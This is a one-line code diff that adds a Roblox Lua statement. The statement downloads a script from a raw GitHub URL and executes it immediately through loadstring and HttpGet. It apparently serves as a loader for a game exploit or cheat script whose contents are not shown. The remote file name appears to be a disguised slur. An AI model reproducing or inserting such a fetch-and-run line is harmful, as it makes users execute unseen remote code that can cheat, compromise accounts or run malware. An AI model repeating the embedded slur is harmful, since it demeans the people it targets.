@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yeerma/such/1353808a0cf32da96f1bead94d5980f4cc1cfa84/nickerfackot'))()
